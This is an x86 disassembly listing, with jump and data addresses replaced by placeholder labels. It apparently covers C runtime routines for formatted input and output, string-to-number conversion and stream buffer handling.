cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
cmp bl 0x2d
jne r-xdata
test esi 0x4
je r-xdata
add [ ebp + 0x18 ] 0x4
mov eax [ ebp + 0x18 ]
mov edx [ eax - 0x4 ]
mov ecx [ ebp - 0x28 ]
mov [ edx ] ecx
mov ecx [ ebp - 0x24 ]
mov [ edx + 0x4 ] ecx
jmp r-xdata
or esi 0x4
and esi 0xfffffff1
inc edi
mov edx esi
and edx 0xfffffff3
or edx 0x2
add edi 0x2
mov esi edx
jmp r-xdata
test esi 0x1
jne r-xdata
movsx eax bl
and eax 0x7f
cmp [ eax + rw-data ] 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x1
add [ ebp + 0x18 ] 0x4
mov ecx [ ebp + 0x18 ]
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x40 ] eax
add [ ebp + 0x18 ] 0x4
mov eax [ ebp + 0x18 ]
mov edx [ eax - 0x4 ]
mov [ ebp - 0x40 ] edx
jmp r-xdata
test esi 0x1
jne r-xdata
mov [ ebp - 0x10 ] 0x7fff
mov al [ edi ]
cmp al [ ebp - 0x19 ]
jle r-xdata
test esi 0x2
je r-xdata
mov eax [ ebp - 0x28 ]
add [ ebp + 0x18 ] 0x4
mov edx [ ebp + 0x18 ]
mov ecx [ edx - 0x4 ]
mov [ ecx ] eax
jmp r-xdata
cmp [ ebp - 0x19 ] 0x6e
je r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
je r-xdata
test esi 0x1
jne r-xdata
inc [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push edx
call [ ebp + 0x8 ]
pop ecx
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
mov ebx eax
je r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
jmp r-xdata
add [ ebp + 0x18 ] 0x4
mov edx [ ebp + 0x18 ]
mov ecx [ edx - 0x4 ]
mov [ ebp - 0x40 ] ecx
cmp [ edi ] 0x5d
je r-xdata
mov eax [ ebp - 0x28 ]
add [ ebp + 0x18 ] 0x4
mov edx [ ebp + 0x18 ]
mov ecx [ edx - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x28 ]
add [ ebp + 0x18 ] 0x4
mov edx [ ebp + 0x18 ]
mov ecx [ edx - 0x4 ]
mov [ ecx ] ax
jmp r-xdata
inc [ ebp - 0x4 ]
jmp r-xdata
test esi 0x1
jne r-xdata
mov [ ebp - 0x10 ] 0x7fff
add [ ebp + 0x18 ] 0x4
mov eax [ ebp + 0x18 ]
mov edx [ eax - 0x4 ]
mov [ ebp - 0x40 ] edx
add [ ebp + 0x18 ] 0x4
mov edx [ ebp + 0x18 ]
mov ecx [ edx - 0x4 ]
mov [ ebp - 0x40 ] ecx
jmp r-xdata
inc [ ebp - 0x4 ]
jmp r-xdata
test esi 0x1
jne r-xdata
dec [ ebp - 0x10 ]
jns r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
call [ ebp + 0x8 ]
pop ecx
mov [ ebp - 0x20 ] eax
mov ebx eax
cmp [ ebp - 0x20 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test eax eax
jg r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
inc [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push edx
call [ ebp + 0x8 ]
pop ecx
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
mov ebx eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
inc [ ebp - 0x19 ]
mov al [ ebp - 0x19 ]
cmp bl al
jg r-xdata
movsx eax bl
mov ecx [ ebp + 0x10 ]
push ecx
push eax
call [ ebp + 0xc ]
add esp 0x8
dec [ ebp - 0x8 ]
test esi 0x1
jne r-xdata
test bl bl
je r-xdata
mov ax [ rw-data ]
mov edx [ rw-data ]
mov [ ebp - 0x100 ] ax
mov [ ebp - 0x100 ] bl
push edx
lea ecx [ ebp - 0x100 ]
push ecx
lea eax [ ebp - 0x42 ]
push eax
call sub_4cc164
add esp 0xc
test eax eax
jle r-xdata
mov ecx [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
mov [ ecx ] bl
jmp r-xdata
mov edx [ rw-data ]
push edx
mov ecx [ ebp - 0x40 ]
push ecx
lea eax [ ebp - 0x102 ]
push eax
call sub_4cc164
add esp 0xc
test eax eax
jle r-xdata
mov eax [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
mov [ eax ] bl
jmp r-xdata
movsx eax bl
mov ecx eax
mov edx 0x1
sar eax 0x3
and ecx 0x7
and eax 0x1f
shl edx cl
movsx eax [ ebp + eax - 0x124 ]
and edx eax
setne dl
and edx 0x1
cmp edx [ ebp - 0x18 ]
je r-xdata
cmp [ ebp - 0x38 ] 0x0
je r-xdata
movsx edx bl
mov eax [ ebp + 0x10 ]
push eax
push edx
call [ ebp + 0xc ]
add esp 0x8
dec [ ebp - 0x8 ]
movsx eax [ ebp - 0x19 ]
mov ecx eax
and ecx 0x7
mov dl 0x1
shl dl cl
sar eax 0x3
and eax 0x1f
or [ ebp + eax - 0x124 ] dl
jmp r-xdata
cmp [ ebp - 0x3c ] 0x0
je r-xdata
test bl 0x80
jne r-xdata
dec [ ebp - 0x8 ]
mov edx [ ebp - 0x40 ]
add [ ebp - 0x40 ] 0x2
mov cx [ ebp - 0x42 ]
mov [ edx ] cx
jmp r-xdata
mov dl [ ebp - 0x102 ]
mov ecx [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
mov [ ecx ] dl
inc [ ebp - 0x38 ]
test esi 0x1
jne r-xdata
cmp [ ebp - 0x20 ] 0xffffffff
je r-xdata
test esi 0x1
jne r-xdata
mov ecx [ ebp - 0x40 ]
mov [ ecx ] 0x0
jmp r-xdata
mov edx [ ebp - 0x40 ]
mov [ edx ] 0x0
jmp r-xdata
dec [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
test edx edx
jg r-xdata
movsx eax bl
and eax 0x7f
cmp [ eax + rw-data ] 0x1
je r-xdata
mov ecx [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
mov [ ecx ] bl
jmp r-xdata
mov ecx [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
mov [ ecx ] 0x0
inc [ ebp - 0x4 ]
sub_4c8050
push ebp
mov ebp esp
add esp 0xffffffdc
xor eax eax
xor edx edx
xor ecx ecx
push ebx
push esi
push edi
mov edi ecx
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
dec [ ebp + 0x18 ]
js r-xdata
test ebx ebx
jl r-xdata
cmp [ ebp - 0xc ] 0x2
je r-xdata
cmp edi 0x1
jne r-xdata
mov edi 0x1
cmp ebx 0x80
jge r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
push ebx
call [ ebp + 0xc ]
add esp 0x8
dec [ ebp - 0x8 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp edi 0x2
jne r-xdata
mov edi 0x2
cmp ebx 0x2b
je r-xdata
push ebx
call sub_4ce904
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x20 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc ebx
jne r-xdata
mov eax [ ebp - 0x18 ]
neg eax
cdq
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
cmp edi 0x3
jne r-xdata
mov edi 0x3
cmp ebx 0x30
jne r-xdata
cmp ebx 0x2d
sete al
and eax 0x1
mov [ ebp - 0x1 ] al
jmp r-xdata
cmp ebx 0x2d
jne r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
call [ ebp + 0x8 ]
pop ecx
mov ebx eax
test edi edi
jne r-xdata
xor ecx ecx
or ecx 0xffffffff
jmp r-xdata
cmp ebx 0x30
jl r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x10 ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0xc ] ecx
cmp ebx 0x61
jl r-xdata
cmp ebx 0x39
jg r-xdata
cmp esi 0x1
jl r-xdata
mov esi 0xa
jmp r-xdata
inc [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push edx
call [ ebp + 0x8 ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp esi 0x10
jne r-xdata
cmp ebx 0x41
jl r-xdata
cmp ebx 0x7a
jg r-xdata
lea eax [ ebx - 0x30 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp esi 0x24
jg r-xdata
cmp ebx 0x78
je r-xdata
cmp ebx 0x5a
jg r-xdata
lea edx [ ebx - 0x57 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
cmp esi [ ebp - 0x1c ]
jle r-xdata
mov esi 0x10
jmp r-xdata
cmp ebx 0x58
jne r-xdata
lea ecx [ ebx - 0x37 ]
mov [ ebp - 0x1c ] ecx
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x20 ] eax
mov eax esi
cdq
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4cc7c0
push edx
push eax
mov eax [ ebp - 0x1c ]
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax esi
cdq
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
push edx
push eax
mov eax [ ebp - 0x1c ]
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
call sub_4cc85b
cmp edx [ ebp - 0x20 ]
jne r-xdata
test esi esi
jne r-xdata
je r-xdata
cmp eax [ ebp - 0x24 ]
mov esi 0x8
mov [ ebp - 0xc ] 0x2
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax 0xffffffff
mov edx 0x7fffffff
xor eax eax
mov edx 0x80000000
jmp r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
sub_4c8280
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp bl [ ebx + 0x17 ]
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jg r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edi 0x7fffffff
jbe r-xdata
push ebx
call sub_4c8724
cmp [ ebx + 0x8 ] 0x0
pop ecx
je r-xdata
push edi
push esi
mov edx [ ebp + 0xc ]
push edx
push ebx
call sub_4c67f0
add esp 0x10
mov esi eax
push ebx
call sub_4c87ec
pop ecx
mov eax esi
push 0x1
push 0x0
push ebx
call sub_4c6b8c
add esp 0xc
sub_4c82e0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov edx [ esi ]
push edx
call sub_4c4cb0
add esp 0xc
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
add [ esi ] ebx
mov ecx [ esi ]
mov [ ecx ] 0x0
sub_4c8310
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jb r-xdata
lea edx [ ebp + 0x14 ]
lea ecx [ ebp + 0x8 ]
push edx
push eax
push 0x1
mov eax [ ebp + 0x10 ]
push eax
push ecx
push sub_4c82e0
call sub_4c8a10
add esp 0x18
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
sub_4c8340
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jb r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push eax
push 0x1
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push sub_4c82e0
call sub_4c8a10
add esp 0x18
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
sub_4c8370
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx 0x1
jb r-xdata
lea eax [ ebp + 0x14 ]
lea ecx [ ebp + 0x8 ]
push eax
push ebx
push 0x1
mov edx [ ebp + 0x10 ]
push edx
push ecx
push sub_4c82e0
call sub_4c8a10
add esp 0x18
cmp ebx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebx
pop ebp
retn
or eax 0xffffffff
sub_4c83a8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx 0x1
jb r-xdata
mov edx [ ebp + 0x14 ]
lea eax [ ebp + 0x8 ]
push edx
push ebx
push 0x1
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push sub_4c82e0
call sub_4c8a10
add esp 0x18
cmp ebx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebx
pop ebp
retn
or eax 0xffffffff
sub_4c83e0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
mov eax ebx
add eax eax
push eax
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ esi ]
push ecx
call sub_4c4cb0
add esp 0xc
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax ebx
add eax eax
add [ esi ] eax
mov edx [ esi ]
mov [ edx ] 0x0
sub_4c8418
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jb r-xdata
lea edx [ ebp + 0x14 ]
lea ecx [ ebp + 0x8 ]
push edx
push eax
push 0x1
mov eax [ ebp + 0x10 ]
push eax
push ecx
push sub_4c83e0
call sub_4c9470
add esp 0x18
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
sub_4c844c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jb r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push eax
push 0x1
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push sub_4c83e0
call sub_4c9470
add esp 0x18
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
sub_4c8480
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx 0x1
jb r-xdata
lea eax [ ebp + 0x14 ]
lea ecx [ ebp + 0x8 ]
push eax
push ebx
push 0x1
mov edx [ ebp + 0x10 ]
push edx
push ecx
push sub_4c83e0
call sub_4c9470
add esp 0x18
cmp ebx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebx
pop ebp
retn
or eax 0xffffffff
sub_4c84bc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx 0x1
jb r-xdata
mov edx [ ebp + 0x14 ]
lea eax [ ebp + 0x8 ]
push edx
push ebx
push 0x1
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push sub_4c83e0
call sub_4c9470
add esp 0x18
cmp ebx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
pop ebx
pop ebp
retn
or eax 0xffffffff
sub_4c84f8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov edx [ esi ]
push edx
call sub_4c4cb0
add esp 0xc
add [ esi ] ebx
mov ecx [ esi ]
mov [ ecx ] 0x0
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4c8520
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov [ eax ] 0x0
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push 0x0
mov edx [ ebp + 0xc ]
push edx
push ecx
push sub_4c84f8
call sub_4c8a10
add esp 0x18
pop ebp
retn
sub_4c8548
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
lea eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push edx
push 0x0
push 0x0
mov ecx [ ebp + 0xc ]
push ecx
push eax
push sub_4c84f8
call sub_4c8a10
add esp 0x18
pop ebp
retn
sub_4c8570
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
inc [ eax ]
mov al [ edx ]
test al al
jne r-xdata
xor ecx ecx
mov cl al
or ecx 0xffffffff
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_4c859c
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp + 0x8 ]
push ecx
push sub_4c8590
push sub_4c8570
call sub_4c77e4
add esp 0x14
pop ebp
retn
sub_4c85c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp + 0x8 ]
push ecx
push sub_4c8590
push sub_4c8570
call sub_4c77e4
add esp 0x14
pop ebp
retn
sub_4c85e4
push ebx
mov ebx rw-data
push rw-data
push rw-data
call sub_4cff84
add esp 0x8
xor eax eax
lea edx [ ebx + 0x17 ]
mov ecx eax
inc eax
shl ecx 0x3
lea ecx [ ecx + ecx * 2 ]
add ecx ebx
mov [ edx ] cl
add edx 0x18
cmp eax 0x3
jl r-xdata
mov eax 0x3
lea edx [ ebx + 0x5e ]
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
mov [ edx ] 0xff
mov ecx eax
shl ecx 0x3
lea ecx [ ecx + ecx * 2 ]
add ecx ebx
mov [ edx + 0x1 ] cl
inc eax
add edx 0x18
movsx eax [ ebx + 0x16 ]
test [ eax * 4 + rw-data ] 0x20
jne r-xdata
push 0x200
test [ ebx + 0x13 ] 0x2
je r-xdata
and [ ebx + 0x12 ] 0xfdff
xor edx edx
mov edx 0x1
jmp r-xdata
push 0x200
test [ ebx + 0x2b ] 0x2
je r-xdata
and [ ebx + 0x2a ] 0xfdff
push edx
push 0x0
push ebx
call sub_4c67f0
movsx eax [ ebx + 0x2e ]
add esp 0x10
test [ eax * 4 + rw-data ] 0x20
jne r-xdata
xor ecx ecx
mov ecx 0x2
jmp r-xdata
push ecx
push 0x0
lea eax [ ebx + 0x18 ]
push eax
call sub_4c67f0
add esp 0x10
pop ebx
retn
sub_4c86ac
push ebx
mov ebx rw-data
call sub_4c8704
test [ ebx + 0x12 ] 0x4
je r-xdata
test [ ebx + 0x2a ] 0x4
je r-xdata
push ebx
call sub_4c6910
pop ecx
mov eax [ ebx + 0x4 ]
push eax
call sub_4c429c
pop ecx
xor edx edx
mov [ ebx + 0xc ] edx
xor ecx ecx
mov [ ebx + 0x8 ] ecx
call sub_4c8714
pop ebx
retn
lea eax [ ebx + 0x18 ]
push eax
call sub_4c6910
pop ecx
mov edx [ ebx + 0x1c ]
push edx
call sub_4c429c
pop ecx
xor ecx ecx
xor eax eax
mov [ ebx + 0x24 ] ecx
mov [ ebx + 0x20 ] eax
sub_4c8724
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
sub eax rw-data
mov ecx 0x18
cdq
idiv ecx
mov ebx eax
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_4c8704
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 4 ] 0x0
jne r-xdata
mov esi [ rw-data ]
shl esi 0x2
push esi
call sub_4c428c
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov eax [ ecx + ebx * 4 ]
push eax
call sub_4cffe8
pop ecx
pop esi
pop ebx
pop ebp
retn
call sub_4c8714
push rw-data
mov edx ebx
shl edx 0x2
add edx eax
push edx
call sub_4cff84
add esp 0x8
push esi
push 0x0
mov edx [ rw-data ]
push edx
call sub_4c4d44
add esp 0xc
push rw-data
call sub_4d0008
pop ecx
sub_4c87ec
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x124
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax esi
sub eax rw-data
mov ecx 0x18
cdq
idiv ecx
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
push eax
call sub_4cfff8
pop ecx
test ebx ebx
je r-xdata
mov eax esi
sub eax rw-data
mov ecx 0x18
cdq
idiv ecx
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
push eax
call sub_4d0064
pop ecx
dec eax
jne r-xdata
pop esi
pop ebx
pop ebp
retn
call sub_4c87c8
mov ebx 0x1
sub_4c8874
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push ebx
call sub_4c8724
pop ecx
cmp esi 0xffffffff
je r-xdata
or esi 0xffffffff
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
and [ ebx + 0x12 ] 0xffdf
lea eax [ ebx + 0x14 ]
cmp eax [ ebx ]
je r-xdata
mov eax esi
mov edx [ ebx ]
mov [ edx ] al
jmp r-xdata
mov edx [ ebx + 0x8 ]
inc edx
mov [ ebx + 0x8 ] edx
cmp edx 0x1
jbe r-xdata
push ebx
call sub_4c87ec
pop ecx
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov [ ebx ] eax
dec [ ebx ]
mov eax [ ebx ]
cmp eax [ ebx + 0x4 ]
jae r-xdata
inc [ ebx ]
mov ecx [ ebx + 0x8 ]
dec ecx
mov [ ebx + 0x8 ] ecx
jmp r-xdata
sub_4c88d8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push ebx
call sub_4c8724
pop ecx
cmp si 0xffff
je r-xdata
mov si 0xffff
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
and [ ebx + 0x12 ] 0xffdf
lea eax [ ebx + 0x14 ]
cmp eax [ ebx ]
je r-xdata
mov eax [ ebx ]
mov [ eax ] si
jmp r-xdata
mov edx [ ebx + 0x8 ]
add edx 0x2
mov [ ebx + 0x8 ] edx
cmp edx 0x2
jbe r-xdata
push ebx
call sub_4c87ec
pop ecx
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov [ ebx ] eax
sub [ ebx ] 0x2
mov eax [ ebx ]
cmp eax [ ebx + 0x4 ]
jae r-xdata
add [ ebx ] 0x2
mov ecx [ ebx + 0x8 ]
sub ecx 0x2
mov [ ebx + 0x8 ] ecx
jmp r-xdata
sub_4c8960
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax 0x1
cmp [ ebx + 0x50 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov edx [ ebx + 0x64 ]
test edx edx
je r-xdata
push eax
mov edx [ ebx + 0x58 ]
push edx
mov ecx [ ebx + 0x50 ]
push ecx
push ebx
call [ ebx + 0x54 ]
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ edx ]
cmp ecx [ ebx + 0x5c ]
ja r-xdata
xor eax eax
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x60 ] 0x1
xor eax eax
sub_4c89a8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx + 0x50 ] 0x50
jl r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
push ebx
call sub_4c8960
pop ecx
mov ecx [ ebx + 0x50 ]
mov al [ ebp + 0x8 ]
mov [ ebx + ecx ] al
inc [ ebx + 0x50 ]
mov edx [ eax ]
cmp edx [ ebx + 0x5c ]
jbe r-xdata
inc [ ebx + 0x5c ]
pop ebx
pop ebp
retn
sub_4c89dc
push ebp
mov ebp esp
push esi
mov ecx 0x7
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
add eax 0x7
add dl 0x37
mov [ eax ] dl
add dl 0x30
mov [ eax ] dl
jmp r-xdata
mov edx esi
and edx 0xf
cmp edx 0xa
jge r-xdata
pop esi
pop ebp
retn
shr esi 0x4
dec ecx
dec eax
test ecx ecx
jge r-xdata
sub_4c8a10
push ebp
mov ebp esp
add esp 0xfffffae0
xor eax eax
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4c0 ] eax
mov [ ebp - 0x4c4 ] eax
mov [ ebp - 0x4d0 ] eax
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4cc ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4c8 ] ecx
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor eax eax
lea eax [ ebp + 0x18 ]
jmp r-xdata
lea ecx [ ebp - 0x520 ]
push ecx
call sub_4c8960
cmp [ ebp - 0x4c0 ] 0x0
pop ecx
je r-xdata
cmp bl 0x25
jne r-xdata
mov [ ebp - 0x4bc ] eax
mov eax [ ebp - 0x4c4 ]
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov al bl
test [ eax + rw-data ] 0x4
je r-xdata
mov bl [ esi ]
cmp bl 0x25
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x520 ]
push eax
push ebx
call sub_4c89a8
add esp 0x8
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
lea edx [ esi - 0x1 ]
xor ecx ecx
mov [ ebp - 0x14 ] edx
xor edx edx
mov [ ebp - 0x10 ] edx
mov eax ecx
mov [ ebp - 0x9 ] 0x0
or ecx 0xffffffff
xor edx edx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] edx
mov edi 0x20
inc esi
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
lea edx [ ebp - 0x520 ]
push edx
push ebx
call sub_4c89a8
add esp 0x8
mov bl [ esi ]
inc esi
mov eax [ ebp - 0x14 ]
inc [ ebp - 0x14 ]
mov al [ eax ]
test al al
jne r-xdata
movsx edx bl
cmp edx 0x7f
jg r-xdata
lea edx [ ebp - 0x520 ]
push edx
push eax
call sub_4c89a8
add esp 0x8
mov ecx ebx
add cl 0xe0
xor edx edx
mov dl cl
xor ecx ecx
mov cl [ edx + rw-data ]
cmp ecx 0x1a
ja r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
jl r-xdata
jmp [ ecx * 4 + jump_table_4c8b02 ]
test eax eax
jg r-xdata
test eax eax
jg r-xdata
test eax eax
jg r-xdata
and edi 0xffffffdf
mov eax 0x5
jmp r-xdata
or edi 0x20
mov eax 0x5
jmp r-xdata
test eax eax
jg r-xdata
add [ ebp + 0x1c ] 0x4
mov edx [ ebp + 0x1c ]
cmp eax 0x2
mov ecx [ edx - 0x4 ]
mov [ ebp - 0x30 ] ecx
jge r-xdata
cmp eax 0x4
jge r-xdata
add bl 0xd0
cmp eax 0x2
jg r-xdata
test edi 0x10
jne r-xdata
mov eax edi
or eax 0x100
and eax 0xffffffef
mov edi eax
mov eax 0x5
jmp r-xdata
mov edx edi
mov eax 0x5
or edx 0x200
and edx 0xffffffef
mov edi edx
jmp r-xdata
cmp [ esi ] 0x36
jne r-xdata
mov [ ebp - 0x38 ] 0x8
jmp r-xdata
mov [ ebp - 0x38 ] 0xa
jmp r-xdata
mov [ ebp - 0x38 ] 0x10
lea ecx [ ebx - 0x17 ]
mov [ ebp - 0x1d ] cl
mov [ ebp - 0x38 ] 0xa
mov cl 0x1
add [ ebp + 0x1c ] 0x4
mov eax [ ebp + 0x1c ]
lea ecx [ ebp - 0xb8 ]
mov edx [ eax - 0x4 ]
mov [ ebp - 0x18 ] edx
push ecx
mov eax [ ebp - 0x18 ]
push eax
call sub_4c89dc
add esp 0x8
mov [ ebp - 0xb0 ] 0x0
and edi 0xfffffffb
lea edx [ ebp - 0xb8 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
test edi 0x210
jne r-xdata
test edi 0x10
je r-xdata
test edi 0x210
jne r-xdata
test edi 0x10
je r-xdata
test edi 0x100
je r-xdata
add [ ebp + 0x1c ] 0x4
mov edx [ ebp + 0x1c ]
test edi 0x10
mov ecx [ edx - 0x4 ]
mov [ ebp - 0x18 ] ecx
je r-xdata
or edi 0x1
jmp r-xdata
or edi 0x2
jmp r-xdata
cmp [ ebp - 0x9 ] 0x2b
je r-xdata
test edi 0x2
jne r-xdata
cmp eax 0x4
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
jge r-xdata
mov eax 0x4
inc [ ebp - 0x8 ]
jmp r-xdata
cmp eax 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0xffffffff
mov eax 0x2
jne r-xdata
mov eax edi
or eax 0x100
and eax 0xffffffef
mov edi eax
jmp r-xdata
test edi 0x100
je r-xdata
cmp [ esi ] 0x33
jne r-xdata
